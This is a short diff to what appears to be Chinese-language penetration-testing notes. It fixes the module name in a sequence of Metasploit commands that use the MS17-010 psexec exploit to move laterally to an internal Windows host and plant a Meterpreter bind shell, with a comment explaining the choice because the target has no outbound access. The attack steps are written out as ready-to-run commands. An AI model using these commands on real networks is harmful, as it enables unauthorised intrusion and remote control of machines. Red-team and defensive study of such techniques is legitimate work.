@@ -461,9 +461,9 @@ AdFind -sc gpodmp
   
   使用exp横向渗透192.168.101.138的主机：
   msf exploit(handler) > use exploit/windows/smb/ms17_010_psexec  
-  msf exploit(ms17_010_eternalblue) > set payload windows/meterpreter/bind_tcp (目标不出网，设置正向shell)
-  msf exploit(ms17_010_eternalblue) > set rhost 192.168.101.138
-  msf exploit(ms17_010_eternalblue) > exploit
+  msf exploit(ms17_010_psexec) > set payload windows/meterpreter/bind_tcp (目标不出网，设置正向shell)
+  msf exploit(ms17_010_psexec) > set rhost 192.168.101.138
+  msf exploit(ms17_010_psexec) > exploit
   
 4.
 
